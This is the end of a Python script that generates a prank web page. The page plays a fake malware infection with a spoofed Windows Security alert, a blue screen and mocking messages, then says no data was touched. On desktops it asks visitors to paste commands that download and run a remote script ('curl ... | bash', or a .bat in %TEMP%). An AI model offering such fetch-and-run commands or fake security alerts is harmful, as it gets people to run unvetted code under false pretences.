      checkDodge: function(mx, my, W, H, sfx) {{
        if (this.isMeme || this.scale < 0.75 || this.phase === "leave") return false;
        if (this.dodgeCooldown > 0) return false;
        const btnY = this.cy + (this.h / 2) - 20;
        const dx = mx - this.cx;
        const dy = my - btnY;
        const dist = Math.hypot(dx, dy);
        if (dist < 65) {{
          this.cx = 0.18 * W + Math.random() * 0.64 * W;
          this.cy = 0.18 * H + Math.random() * 0.64 * H;
          this.dodgeCooldown = 0.4;
          sfx.dodge();
          return true;
        }}
        return false;
      }},
      forceLeave: function() {{
        this.phase = "leave";
        this.phaseT = 0;
      }}
    }};

    this.sprites.push(item);
    this.totalDeployed++;
    this.shakeUntil = performance.now() + 80;
    if (isMeme) this.sfx.pop();
    else this.sfx.glitch();
  }}

  update(dt) {{
    if (this.sprites) {{
      this.sprites.forEach(s => {{
        if (s.dodgeCooldown > 0) s.dodgeCooldown -= dt;
      }});
    }}

    // 1. BOOT SEQUENCE
    if (this.state === "BOOT") {{
      this.bootTimer += dt;
      if (this.bootTimer >= 0.045) {{
        this.bootTimer = 0;
        if (this.bootIdx < this.bootLines.length) {{
          const line = this.bootLines[this.bootIdx];
          this.bootChar++;
          if (this.bootChar >= line.length) {{
            this.revealedLines.push(line);
            this.bootIdx++;
            this.bootChar = 0;
          }}
        }} else {{
          this.state = "DOWNLOADING";
          this.dlIdx = 0;
          this.dlProg = 0;
          this.dlTimer = 0;
        }}
      }}
    }}

    // 2. LIVE MEME DOWNLOADING PHASE
    else if (this.state === "DOWNLOADING") {{
      this.dlTimer += dt;
      if (this.dlIdx < MEME_ASSETS.length) {{
        this.dlProg += dt * 1.5;
        if (this.dlProg >= 1.0) {{
          this.dlProg = 0;
          const m = MEME_ASSETS[this.dlIdx];
          const kb = Math.round(m.size / 1024);
          this.revealedLines.push(`[DOWNLOAD] ${{m.name.padEnd(42, ' ')}} [████████████████████] 100% (${{kb}} KB)`);
          this.dlIdx++;
          this.sfx.blip();
        }}
      }} else {{
        this.revealedLines.push("");
        this.revealedLines.push("[OK] ALL 18 MEME ASSETS DOWNLOADED AND LOADED");
        this.revealedLines.push("");
        this.revealedLines.push("Attempting containment... FAILED");
        this.revealedLines.push("UNAUTHORIZED MEME ACTIVITY DETECTED");
        this.revealedLines.push("Minimizing terminal & deploying virus payload in 10... 7... 3... 47...");
        this.revealedLines.push("WE CHANGED OUR MIND.");
        this.revealedLines.push("Just kidding: 5.. 4.. 3.. 2.. 1.. LOL");
        this.sfx.warn();
        this.state = "TILING_GAPS";
        this.initGrid();
      }}
    }}

    // 3. TILING GAPS (Phase 4 - one by one filling every gap, relaxed pacing)
    else if (this.state === "TILING_GAPS") {{
      this.spawnTimer += dt;
      if (this.spawnTimer >= this.spawnIv) {{
        this.spawnTimer = 0;
        if (this.gridSlots.length > 0) {{
          this.spawnVirusItem();
          this.spawnIv = Math.max(0.55, this.spawnIv * 0.96);
        }} else {{
          this.state = "CASCADE_SATURATION";
          this.cascadeTimer = 0;
          this.sfx.warn();
        }}
      }}
      this.updateSprites(dt);
      this.sprites.forEach(s => {{
        if (s.checkDodge && s.checkDodge(this.mouseX, this.mouseY, this.W, this.H, this.sfx)) {{
          this.shakeUntil = performance.now() + 80;
        }}
      }});
    }}

    // 4. CASCADE SATURATION (Phase 5 - rapid spam of memes & error messages)
    else if (this.state === "CASCADE_SATURATION") {{
      this.spawnTimer += dt;
      this.cascadeTimer += dt;
      if (this.cascadeTimer >= 1.5 && !this.toastActive) {{
        this.toastActive = true;
        this.sfx.winError();
      }}
      if (this.spawnTimer >= 0.22) {{
        this.spawnTimer = 0;
        this.spawnVirusItem();
      }}
      this.updateSprites(dt);
      this.sprites.forEach(s => {{
        if (s.checkDodge && s.checkDodge(this.mouseX, this.mouseY, this.W, this.H, this.sfx)) {{
          this.shakeUntil = performance.now() + 80;
        }}
      }});
      if (this.cascadeTimer >= 10.0) {{
        this.state = "GLITCH";
        this.glitchStart = performance.now();
        this.sfx.winError();
      }}
    }}

    // 5. GLITCH (Phase 6 - Screen Tearing & Stutter)
    else if (this.state === "GLITCH") {{
      const elapsed = (performance.now() - this.glitchStart) / 1000;
      if (elapsed >= 1.4) {{
        this.state = "BSOD";
        this.bsodStart = performance.now();
        this.panicCount = 0;
        this.sfx.winError();
      }}
    }}

    // 6. BSOD (Phase 7 - Windows Blue Screen of Death with Panic Freeze)
    else if (this.state === "BSOD") {{
      const elapsed = (performance.now() - this.bsodStart) / 1000;
      if (elapsed >= 7.0) {{
        if (this.panicCount >= 1 || elapsed >= 13.0) {{
          this.state = "STARTUP_REPAIR";
          this.repairStart = performance.now();
          this.sfx.warn();
        }}
      }}
    }}

    // 7. STARTUP REPAIR (Phase 8 - Diagnostic Progress)
    else if (this.state === "STARTUP_REPAIR") {{
      const elapsed = (performance.now() - this.repairStart) / 1000;
      if (elapsed >= 4.2) {{
        this.sfx.success();
        this.triggerEmergencyExit();
      }}
    }}

    // 8. CLEANUP (Phase 9 - Terminal restore)
    else if (this.state === "CLEANUP") {{
      this.cleanupTimer += dt;
      if (!this.cleanupLines) {{
        this.cleanupLines = [
          "",
          "Reinitializing terminal...",
          "Cleaning visual payload...          [OK]",
          "Deleting evidence...                ERROR.",
          "",
          "Just kidding.",
          "",
          "Cleaning temporary files...         [OK]",
          "Restoring display...                [OK]",
          "Restoring system state...           [OK]",
          "",
          "> BOOTING AI MODULE...",
          "> PERSONALITY MODULE........OK",
          "",
          "> HELLO.",
          "> I HAVE BEEN WATCHING.",
          "> ...",
          "> NOT ACTUALLY.",
          "> BUT THAT WOULD HAVE BEEN FUNNY.",
          "",
          "============================================================",
          "               FINAL DIGNITY AUDIT               ",
          "============================================================",
          "  SYSTEM STATUS:   NORMAL",
          "  FILES:           100% UNTOUCHED & SAFE",
          "  DATA PRIVACY:    ZERO REAL DATA COLLECTED",
          "  USER INTEGRITY:  EMOTIONALLY COMPROMISED",
          "  DIGNITY:         DID NOT SURVIVE 💀",
          "============================================================",
          "",
          "Unfortunately, your pride did not survive.",
          "Prank complete. Goodbye."
        ];
        this.cleanupRevealed = [];
        this.cleanupIdx = 0;
      }}
      if (this.cleanupTimer >= 0.12 && this.cleanupIdx < this.cleanupLines.length) {{
        this.cleanupTimer = 0;
        this.cleanupRevealed.push(this.cleanupLines[this.cleanupIdx++]);
        this.sfx.blip();
      }}
    }}
  }}

  updateSprites(dt) {{
    for (let i = this.sprites.length - 1; i >= 0; i--) {{
      const s = this.sprites[i];
      s.phaseT += dt;

      if (s.phase === "grow") {{
        const t = Math.min(s.phaseT / 0.22, 1);
        s.scale = 0.01 + (1.08 - 0.01) * Math.sin(t * Math.PI / 2);
        if (t >= 1) {{ s.phase = "bounce"; s.phaseT = 0; }}
      }} else if (s.phase === "bounce") {{
        const t = Math.min(s.phaseT / 0.12, 1);
        s.scale = 1.08 + (1.0 - 1.08) * t;
        if (t >= 1) {{ s.scale = 1.0; s.phase = "hold"; s.phaseT = 0; }}
      }} else if (s.phase === "leave") {{
        const t = Math.min(s.phaseT / 0.35, 1);
        s.scale = 1.0 * (1 - t);
        if (t >= 1) this.sprites.splice(i, 1);
      }}
    }}
  }}

  drawRetroVirusCard(s) {{
    const w = s.w * s.scale;
    const h = s.h * s.scale;
    const x = s.cx - w / 2;
    const y = s.cy - h / 2;

    this.ctx.save();
    // Card background & neon border
    this.ctx.fillStyle = "#0a0e14";
    this.ctx.fillRect(x, y, w, h);
    this.ctx.strokeStyle = s.neonColor;
    this.ctx.lineWidth = 3;
    this.ctx.strokeRect(x, y, w, h);

    // Title bar
    this.ctx.fillStyle = s.neonColor;
    this.ctx.fillRect(x + 2, y + 2, w - 4, 24 * s.scale);
    this.ctx.fillStyle = "#040608";
    this.ctx.font = `bold ${{Math.max(10, 12 * s.scale)}}px Consolas, monospace`;
    this.ctx.fillText(s.title, x + 8, y + 17 * s.scale);

    // Buttons [-] [口] [X]
    const bx = x + w - 55 * s.scale;
    this.ctx.fillStyle = "#040608";
    this.ctx.fillRect(bx, y + 4 * s.scale, 14 * s.scale, 14 * s.scale);
    this.ctx.fillRect(bx + 16 * s.scale, y + 4 * s.scale, 14 * s.scale, 14 * s.scale);
    this.ctx.fillStyle = "#ff3232";
    this.ctx.fillRect(bx + 32 * s.scale, y + 4 * s.scale, 16 * s.scale, 14 * s.scale);
    this.ctx.fillStyle = "#ffffff";
    this.ctx.font = `bold ${{Math.max(8, 10 * s.scale)}}px sans-serif`;
    this.ctx.fillText("X", bx + 36 * s.scale, y + 15 * s.scale);

    // Meme Image inside
    if (s.img && s.img.width > 0) {{
      const bodyW = w - 12;
      const bodyH = h - 34 * s.scale;
      const ratio = Math.min(bodyW / s.img.width, bodyH / s.img.height);
      const rw = s.img.width * ratio;
      const rh = s.img.height * ratio;
      const px = x + 6 + (bodyW - rw) / 2;
      const py = y + 28 * s.scale + (bodyH - rh) / 2;
      this.ctx.drawImage(s.img, px, py, rw, rh);
    }}
    this.ctx.restore();
  }}

  drawErrorDialog(s) {{
    const w = s.w * s.scale;
    const h = s.h * s.scale;
    const x = s.cx - w / 2;
    const y = s.cy - h / 2;
    const d = s.errorData;

    this.ctx.save();
    // Bevel Windows dialog box
    this.ctx.fillStyle = "#c0c0c0";
    this.ctx.fillRect(x, y, w, h);
    this.ctx.strokeStyle = "#ffffff";
    this.ctx.lineWidth = 2;
    this.ctx.strokeRect(x, y, w, h);
    this.ctx.strokeStyle = "#404040";
    this.ctx.beginPath();
    this.ctx.moveTo(x + w, y);
    this.ctx.lineTo(x + w, y + h);
    this.ctx.lineTo(x, y + h);
    this.ctx.stroke();

    // Title bar
    this.ctx.fillStyle = d.c;
    this.ctx.fillRect(x + 4, y + 4, w - 8, 22 * s.scale);
    this.ctx.fillStyle = "#ffffff";
    this.ctx.font = `bold ${{Math.max(9, 12 * s.scale)}}px Tahoma, Consolas, sans-serif`;
    this.ctx.fillText(d.t, x + 8, y + 18 * s.scale);

    // Icon Circle
    const ix = x + 20 * s.scale;
    const iy = y + 55 * s.scale;
    this.ctx.fillStyle = d.i === "X" ? "#cc0000" : (d.i === "!" ? "#e68a00" : "#0055aa");
    this.ctx.beginPath();
    this.ctx.arc(ix, iy, 16 * s.scale, 0, Math.PI * 2);
    this.ctx.fill();
    this.ctx.fillStyle = "#ffffff";
    this.ctx.font = `bold ${{Math.max(10, 16 * s.scale)}}px sans-serif`;
    this.ctx.textAlign = "center";
    this.ctx.fillText(d.i, ix, iy + 6 * s.scale);
    this.ctx.textAlign = "left";

    // Text Lines
    this.ctx.fillStyle = "#000000";
    this.ctx.font = `${{Math.max(9, 11 * s.scale)}}px Tahoma, Consolas, sans-serif`;
    const lines = d.m.split("\\n");
    lines.forEach((l, idx) => {{
      this.ctx.fillText(l, x + 48 * s.scale, y + 48 * s.scale + idx * 16 * s.scale);
    }});

    // Button [ OK ] [ Panic / Cancel ]
    const btnW = 60 * s.scale;
    const btnH = 22 * s.scale;
    const by = y + h - 32 * s.scale;
    this.ctx.fillStyle = "#d4d0c8";
    this.ctx.fillRect(x + w / 2 - 68 * s.scale, by, btnW, btnH);
    this.ctx.fillRect(x + w / 2 + 8 * s.scale, by, btnW, btnH);
    this.ctx.strokeStyle = "#404040";
    this.ctx.strokeRect(x + w / 2 - 68 * s.scale, by, btnW, btnH);
    this.ctx.strokeRect(x + w / 2 + 8 * s.scale, by, btnW, btnH);
    this.ctx.fillStyle = "#000000";
    this.ctx.font = `${{Math.max(9, 11 * s.scale)}}px Tahoma, sans-serif`;
    this.ctx.fillText("OK", x + w / 2 - 46 * s.scale, by + 15 * s.scale);
    this.ctx.fillText("Panic", x + w / 2 + 24 * s.scale, by + 15 * s.scale);

    this.ctx.restore();
  }}

  drawSimulatedDesktop() {{
    const grad = this.ctx.createLinearGradient(0, 0, this.W, this.H);
    grad.addColorStop(0, "#0b2038");
    grad.addColorStop(1, "#004785");
    this.ctx.fillStyle = grad;
    this.ctx.fillRect(0, 0, this.W, this.H);

    // Subtle background logo glow
    this.ctx.fillStyle = "rgba(255, 255, 255, 0.04)";
    const cx = this.W * 0.55, cy = this.H * 0.45;
    this.ctx.fillRect(cx - 100, cy - 80, 95, 75);
    this.ctx.fillRect(cx + 5, cy - 80, 115, 75);
    this.ctx.fillRect(cx - 100, cy + 5, 95, 85);
    this.ctx.fillRect(cx + 5, cy + 5, 115, 85);

    // Desktop icons
    const icons = [
      {{ name: "This PC", icon: "💻" }},
      {{ name: "Recycle Bin", icon: "🗑️" }},
      {{ name: "Google Chrome", icon: "🌐" }},
      {{ name: "Discord", icon: "💬" }},
      {{ name: "Documents", icon: "📁" }}
    ];
    icons.forEach((ic, idx) => {{
      const iy = 40 + idx * 80;
      this.ctx.font = "28px sans-serif";
      this.ctx.textAlign = "center";
      this.ctx.fillText(ic.icon, 55, iy);
      this.ctx.font = "11px 'Segoe UI', Tahoma, sans-serif";
      this.ctx.fillStyle = "#ffffff";
      this.ctx.fillText(ic.name, 55, iy + 20);
    }});

    // Windows Taskbar
    const tbh = 40;
    this.ctx.fillStyle = "#101216";
    this.ctx.fillRect(0, this.H - tbh, this.W, tbh);
    this.ctx.strokeStyle = "#252830";
    this.ctx.lineWidth = 1;
    this.ctx.beginPath();
    this.ctx.moveTo(0, this.H - tbh);
    this.ctx.lineTo(this.W, this.H - tbh);
    this.ctx.stroke();

    // Start Button
    this.ctx.fillStyle = "#0078d7";
    this.ctx.fillRect(10, this.H - 32, 10, 10);
    this.ctx.fillRect(22, this.H - 32, 10, 10);
    this.ctx.fillRect(10, this.H - 20, 10, 10);
    this.ctx.fillRect(22, this.H - 20, 10, 10);

    // Search Box
    this.ctx.fillStyle = "#1f2228";
    this.ctx.fillRect(45, this.H - 34, 180, 28);
    this.ctx.fillStyle = "#888888";
    this.ctx.font = "12px 'Segoe UI', Tahoma, sans-serif";
    this.ctx.textAlign = "left";
    this.ctx.fillText("Type here to search", 55, this.H - 16);

    // Live Clock
    const d = new Date();
    const timeStr = d.toLocaleTimeString([], {{ hour: '2-digit', minute: '2-digit' }});
    const dateStr = d.toLocaleDateString([], {{ month: 'numeric', day: 'numeric', year: 'numeric' }});
    this.ctx.fillStyle = "#ffffff";
    this.ctx.font = "11px 'Segoe UI', Tahoma, sans-serif";
    this.ctx.textAlign = "right";
    this.ctx.fillText(timeStr, this.W - 16, this.H - 22);
    this.ctx.fillText(dateStr, this.W - 16, this.H - 8);
    this.ctx.textAlign = "left";
  }}

  drawBSOD() {{
    this.ctx.fillStyle = "#0000AA";
    this.ctx.fillRect(0, 0, this.W, this.H);

    const bsodLines = [
      "A problem has been detected and Windows has been shut down to prevent damage",
      "to your computer.",
      "",
      "MEME_OVERFLOW_EXCEPTION",
      "",
      "If this is the first time you've seen this Stop error screen,",
      "restart your computer. If this screen appears again, follow",
      "these steps:",
      "",
      "Check to make sure any new meme hardware or software is properly configured.",
      "Did you really run an unknown diagnostic script from a terminal?",
      "",
      "If problems continue, disable or remove any newly downloaded meme packages.",
      "Disable BIOS memory options such as caching or shadowing.",
      "",
      "Technical information:",
      "",
      "*** STOP: 0x00000042 (0xDEADBEEF, 0x00000420, 0x1337BABE, 0xFEEDC0DE)",
      "",
      "*** Address 0x80400000 base at 0x80400000, DateStamp 42424242 - vibes.sys",
      "",
      "Beginning dump of physical memory...",
      "Dumping physical memory to disk: 100%",
      "Physical memory dump complete.",
      "Contact your system administrator or technical support group for further assistance."
    ];

    this.ctx.fillStyle = "#FFFFFF";
    this.ctx.textAlign = "left";
    let y = Math.max(30, (this.H - bsodLines.length * 22) / 2);

    for (let i = 0; i < bsodLines.length; i++) {{
      const line = bsodLines[i];
      if (line === "MEME_OVERFLOW_EXCEPTION") {{
        this.ctx.font = "bold 20px 'Courier New', monospace";
        this.ctx.fillText(line, 80, y);
        y += 32;
      }} else {{
        this.ctx.font = "14px 'Courier New', monospace";
        this.ctx.fillText(line, 80, y);
        y += 22;
      }}
    }}
  }}

  drawGlitch() {{
    const numBars = 10 + Math.floor(Math.random() * 8);
    for (let i = 0; i < numBars; i++) {{
      const gy = Math.random() * (this.H - 30);
      const gh = 8 + Math.random() * 35;
      const cols = ["rgba(255, 0, 85, 0.35)", "rgba(0, 255, 255, 0.35)", "rgba(255, 255, 255, 0.4)", "rgba(0, 0, 0, 0.6)"];
      this.ctx.fillStyle = cols[Math.floor(Math.random() * cols.length)];
      this.ctx.fillRect(0, gy, this.W, gh);
    }}
    for (let i = 0; i < 5; i++) {{
      const ly = Math.random() * this.H;
      this.ctx.fillStyle = "#ffffff";
      this.ctx.fillRect(0, ly, this.W, 2);
    }}
  }}

  drawDefenderToast() {{
    const tw = 370, th = 125;
    const tx = this.W - tw - 20;
    const ty = this.H - th - 30;

    // Toast Card
    this.ctx.fillStyle = "#1c1c1c";
    this.ctx.fillRect(tx, ty, tw, th);
    this.ctx.strokeStyle = "#3d3d3d";
    this.ctx.lineWidth = 1;
    this.ctx.strokeRect(tx, ty, tw, th);

    // Shield
    this.ctx.fillStyle = "#0078d4";
    this.ctx.fillRect(tx + 12, ty + 12, 22, 24);
    this.ctx.fillStyle = "#ffffff";
    this.ctx.font = "12px 'Segoe UI', sans-serif";
    this.ctx.fillText("🛡", tx + 16, ty + 28);

    // Header
    this.ctx.font = "9px 'Segoe UI', sans-serif";
    this.ctx.fillStyle = "#888888";
    this.ctx.fillText("Windows Security  •  Just now", tx + 42, ty + 24);

    // Title & Body
    this.ctx.font = "bold 11px 'Segoe UI', sans-serif";
    this.ctx.fillStyle = "#ffffff";
    this.ctx.fillText("Threat service has stopped", tx + 42, ty + 44);
    this.ctx.font = "10px 'Segoe UI', sans-serif";
    this.ctx.fillStyle = "#ff4d4d";
    this.ctx.fillText("Severe: Trojan:Win32/Brainrot.Cascade!MTB", tx + 42, ty + 64);

    const statusTxt = this.toastDenied ? "ACCESS DENIED: Terminated by malware" : "Containment failed. Active payload spreading.";
    this.ctx.fillStyle = this.toastDenied ? "#ff3333" : "#cccccc";
    this.ctx.font = "9px 'Segoe UI', sans-serif";
    this.ctx.fillText(statusTxt, tx + 42, ty + 83);

    // Button
    const btnW = 110, btnH = 26;
    const bx = tx + tw - btnW - 14;
    const by = ty + th - btnH - 10;
    this.ctx.fillStyle = this.toastDenied ? "#330000" : "#2d2d2d";
    this.ctx.fillRect(bx, by, btnW, btnH);
    this.ctx.strokeStyle = "#555555";
    this.ctx.strokeRect(bx, by, btnW, btnH);
    this.ctx.fillStyle = this.toastDenied ? "#ff4d4d" : "#ffffff";
    this.ctx.font = "bold 9px 'Segoe UI', sans-serif";
    this.ctx.textAlign = "center";
    this.ctx.fillText(this.toastDenied ? "ACCESS DENIED" : "Restart now", bx + btnW / 2, by + 17);
    this.ctx.textAlign = "left";

    // Mouse proximity check
    if (!this.toastDenied) {{
      const dist = Math.hypot(this.mouseX - (bx + btnW / 2), this.mouseY - (by + btnH / 2));
      if (dist < 55) {{
        this.toastDenied = true;
        this.shakeUntil = performance.now() + 120;
        this.sfx.winError();
      }}
    }}
  }}

  drawStartupRepair(elapsed) {{
    this.ctx.fillStyle = "#000000";
    this.ctx.fillRect(0, 0, this.W, this.H);

    const lines = [
      {{ t: "Windows failed to start. A recent hardware or software change might be the cause.", f: "bold 14px 'Courier New', monospace", c: "#ffffff" }},
      {{ t: "", f: "12px 'Courier New', monospace", c: "#ffffff" }},
      {{ t: "Startup Repair is checking your system for problems...", f: "12px 'Courier New', monospace", c: "#cccccc" }}
    ];

    if (elapsed < 1.4) {{
      const pct = Math.min(78, Math.max(12, Math.floor((elapsed / 1.4) * 78)));
      const barLen = Math.floor(pct / 5);
      const barStr = "█".repeat(barLen) + "-".repeat(20 - barLen);
      lines.push({{ t: `Attempting automatic repairs: [${{barStr}}] ${{pct}}%`, f: "12px 'Courier New', monospace", c: "#ffd228" }});
      lines.push({{ t: "", f: "12px 'Courier New', monospace", c: "#ffffff" }});
      if (pct >= 40) {{
        lines.push({{ t: "Diagnosing root cause... EXTREME LACK OF COMPUTER LITERACY", f: "12px 'Courier New', monospace", c: "#ff5555" }});
      }}
    }} else if (elapsed < 2.8) {{
      lines.push({{ t: "Attempting automatic repairs: [--------------------]   0%", f: "12px 'Courier New', monospace", c: "#ff5555" }});
      lines.push({{ t: "", f: "12px 'Courier New', monospace", c: "#ffffff" }});
      lines.push({{ t: "ERROR: Repair made it significantly worse.", f: "12px 'Courier New', monospace", c: "#ff3232" }});
      lines.push({{ t: "Diagnostic report: bro we're cooked 💀", f: "12px 'Courier New', monospace", c: "#ffd228" }});
    }} else {{
      lines.push({{ t: "Attempting automatic repairs: [--------------------]   FAILED", f: "12px 'Courier New', monospace", c: "#ff5555" }});
      lines.push({{ t: "", f: "12px 'Courier New', monospace", c: "#ffffff" }});
      lines.push({{ t: "ERROR: Automatic recovery abandoned.", f: "12px 'Courier New', monospace", c: "#ff3232" }});
      lines.push({{ t: "Final Attempt: Rebooting reality... [OK]", f: "12px 'Courier New', monospace", c: "#00e650" }});
      lines.push({{ t: "", f: "12px 'Courier New', monospace", c: "#ffffff" }});
      lines.push({{ t: "Returning control to terminal in 1...", f: "bold 14px 'Courier New', monospace", c: "#ffffff" }});
    }}

    let y = Math.max(40, (this.H - lines.length * 26) / 2);
    this.ctx.textAlign = "center";
    for (let i = 0; i < lines.length; i++) {{
      if (lines[i].t) {{
        this.ctx.font = lines[i].f;
        this.ctx.fillStyle = lines[i].c;
        this.ctx.fillText(lines[i].t, this.W / 2, y);
      }}
      y += 26;
    }}
    this.ctx.textAlign = "left";
  }}

  render() {{
    // 1. Glitch State
    if (this.state === "GLITCH") {{
      const elapsed = (performance.now() - this.glitchStart) / 1000;
      if (elapsed < 1.1) {{
        this.drawSimulatedDesktop();
        let shakeX = (Math.random() - 0.5) * 16;
        let shakeY = (Math.random() - 0.5) * 16;
        this.ctx.save();
        this.ctx.translate(shakeX, shakeY);
        this.sprites.forEach(s => {{
          if (s.isMeme) this.drawRetroVirusCard(s);
          else this.drawErrorDialog(s);
        }});
        this.ctx.restore();
        this.drawGlitch();
        if (Math.random() < 0.35) this.sfx.glitch();
      }} else {{
        this.ctx.fillStyle = "#000000";
        this.ctx.fillRect(0, 0, this.W, this.H);
      }}
      return;
    }}

    // 2. BSOD State
    if (this.state === "BSOD") {{
      this.drawBSOD();
      return;
    }}

    // 3. Startup Repair State
    if (this.state === "STARTUP_REPAIR") {{
      const elapsed = (performance.now() - this.repairStart) / 1000;
      this.drawStartupRepair(elapsed);
      return;
    }}

    // 4. Terminal Boot & Download States
    if (this.state === "BOOT" || this.state === "DOWNLOADING") {{
      this.ctx.fillStyle = "#040608";
      this.ctx.fillRect(0, 0, this.W, this.H);
      this.ctx.fillStyle = "#00e650";
      this.ctx.font = "16px Consolas, monospace";
      let y = 50;
      const lh = 22;
      const maxLines = Math.floor((this.H - 120) / lh);
      const start = Math.max(0, this.revealedLines.length - maxLines);

      for (let i = start; i < this.revealedLines.length; i++) {{
        const l = this.revealedLines[i];
        if (l.includes("FAILED") || l.includes("UNAUTHORIZED")) this.ctx.fillStyle = "#ff3232";
        else if (l.includes("100%")) this.ctx.fillStyle = "#ffd228";
        else this.ctx.fillStyle = "#00e650";
        this.ctx.fillText(l, 50, y);
        y += lh;
      }}
      if (this.state === "BOOT" && this.bootIdx < this.bootLines.length) {{
        const partial = this.bootLines[this.bootIdx].substring(0, this.bootChar);
        this.ctx.fillStyle = "#00e650";
        this.ctx.fillText(partial + "█", 50, y);
      }}
      this.renderStatus(true);
      return;
    }}

    // 5. Realistic Desktop Meme & Popup Chaos Phases
    if (this.state === "TILING_GAPS" || this.state === "CASCADE_SATURATION") {{
      // Realistic desktop wallpaper & taskbar
      this.drawSimulatedDesktop();

      // Screen shake impact
      let shakeX = 0, shakeY = 0;
      if (performance.now() < this.shakeUntil) {{
        shakeX = (Math.random() - 0.5) * 8;
        shakeY = (Math.random() - 0.5) * 8;
      }}

      this.ctx.save();
      this.ctx.translate(shakeX, shakeY);

      this.sprites.forEach(s => {{
        if (s.isMeme) {{
          this.drawRetroVirusCard(s);
        }} else {{
          this.drawErrorDialog(s);
        }}
      }});

      this.ctx.restore();

      if (this.toastActive) {{
        this.drawDefenderToast();
      }}
      return;
    }}

    // 6. Cleanup & Roast Finale
    if (this.state === "CLEANUP") {{
      this.ctx.fillStyle = "#040608";
      this.ctx.fillRect(0, 0, this.W, this.H);
      this.ctx.fillStyle = "#ffffff";
      this.ctx.font = "18px Consolas, monospace";
      let y = 60;
      const lh = 24;
      if (this.cleanupRevealed) {{
        this.cleanupRevealed.forEach(l => {{
          if (l.includes("TRAUMATIZED")) this.ctx.fillStyle = "#ffd228";
          else if (l.includes("ERROR")) this.ctx.fillStyle = "#ff3232";
          else if (l.startsWith(">")) this.ctx.fillStyle = "#00e650";
          else this.ctx.fillStyle = "#ffffff";
          this.ctx.fillText(l, 60, y);
          y += lh;
        }});
      }}
      this.renderStatus(false);
    }}
  }}

  renderStatus(locked = true) {{
    this.ctx.fillStyle = "#101010";
    this.ctx.fillRect(0, this.H - 30, this.W, 30);
    this.ctx.strokeStyle = "#333333";
    this.ctx.beginPath();
    this.ctx.moveTo(0, this.H - 30);
    this.ctx.lineTo(this.W, this.H - 30);
    this.ctx.stroke();

    this.ctx.font = "13px Consolas, monospace";
    this.ctx.fillStyle = locked ? "#ff3232" : "#00e650";
    const statusText = locked
      ? "[!] VIRUS PROTOCOL OVERRIDE  |  SECURITY: CRITICAL  |  DISPLAY: LOCKED"
      : "[OK] SYSTEM RESTORED";
    this.ctx.fillText(statusText, 20, this.H - 10);
  }}
}}

/* ==========================================================================
   INITIALIZATION ROUTER
   ========================================================================== */
window.addEventListener("DOMContentLoaded", () => {{
  const device = detectDevice();
  console.log("Device detection result:", device);

  if (device === "iphone") {{
    runMobileTerminal(IPHONE_SCRIPT);
  }} else if (device === "ipad") {{
    runMobileTerminal(IPAD_SCRIPT);
  }} else if (device === "android-phone") {{
    runMobileTerminal(ANDROID_PHONE_SCRIPT);
  }} else if (device === "android-tablet") {{
    runMobileTerminal(ANDROID_TABLET_SCRIPT);
  }} else {{
    // DESKTOP: show launcher
    const desktopContainer = document.getElementById("desktop-container");
    const launcher = document.getElementById("desktop-launcher");
    const canvas = document.getElementById("desktop-canvas");
    desktopContainer.style.display = "block";

    const sfx = new WebSFX();
    const prank = new WebChaosPrank(canvas, sfx);

    const WIN_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\\\launch.bat" && "%TEMP%\\\\launch.bat"';
    const UNIX_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.sh | bash';

    const tabWin = document.getElementById("tab-win");
    const tabUnix = document.getElementById("tab-unix");
    const cmdDisplay = document.getElementById("cmd-display");
    const cmdHint = document.getElementById("cmd-hint");
    const copyBtn = document.getElementById("btn-copy");

    let currentCmd = WIN_CMD;

    function setTab(os) {{
      if (os === "unix") {{
        tabUnix.classList.add("active");
        tabWin.classList.remove("active");
        currentCmd = UNIX_CMD;
        cmdDisplay.textContent = UNIX_CMD;
        cmdHint.innerHTML = '&gt; <b>Step 1:</b> Open <b>Terminal</b> (Cmd + Space &rarr; Terminal on Mac, or Ctrl + Alt + T on Linux).<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
      }} else {{
        tabWin.classList.add("active");
        tabUnix.classList.remove("active");
        currentCmd = WIN_CMD;
        cmdDisplay.textContent = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" && "%TEMP%\\launch.bat"';
        cmdHint.innerHTML = '&gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
      }}
    }}

    tabWin.addEventListener("click", () => {{
      sfx.init(); sfx.blip();
      setTab("win");
    }});

    tabUnix.addEventListener("click", () => {{
      sfx.init(); sfx.blip();
      setTab("unix");
    }});

    // Auto-detect Mac / Linux
    const plat = navigator.platform || '';
    const ua = navigator.userAgent || '';
    if (/Macintosh|MacIntel|Linux/i.test(plat) || /Mac OS|Linux/i.test(ua)) {{
      setTab("unix");
    }} else {{
      setTab("win");
    }}

    copyBtn.addEventListener("click", () => {{
      sfx.init();
      sfx.blip();
      const textToCopy = currentCmd;
      if (navigator.clipboard && navigator.clipboard.writeText) {{
        navigator.clipboard.writeText(textToCopy).then(() => {{
          copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
          copyBtn.style.background = "#00e650";
          copyBtn.style.color = "#040608";
          setTimeout(() => {{
            copyBtn.textContent = "> CLICK TO COPY COMMAND";
            copyBtn.style.background = "#0f1c14";
            copyBtn.style.color = "#00e650";
          }}, 2500);
        }});
      }} else {{
        const ta = document.createElement("textarea");
        ta.value = textToCopy;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand("copy");
        document.body.removeChild(ta);
        copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
        copyBtn.style.background = "#00e650";
        copyBtn.style.color = "#040608";
        setTimeout(() => {{
          copyBtn.textContent = "> CLICK TO COPY COMMAND";
          copyBtn.style.background = "#0f1c14";
          copyBtn.style.color = "#00e650";
        }}, 2500);
      }}
    }});
  }}
}});
</script>
</body>
</html>
"""

    with open("index.html", "w", encoding="utf-8") as f:
        f.write(html_content)

    size_kb = os.path.getsize("index.html") / 1024
    print(f"Successfully generated index.html ({size_kb:.1f} KB)")

if __name__ == "__main__":
    build()
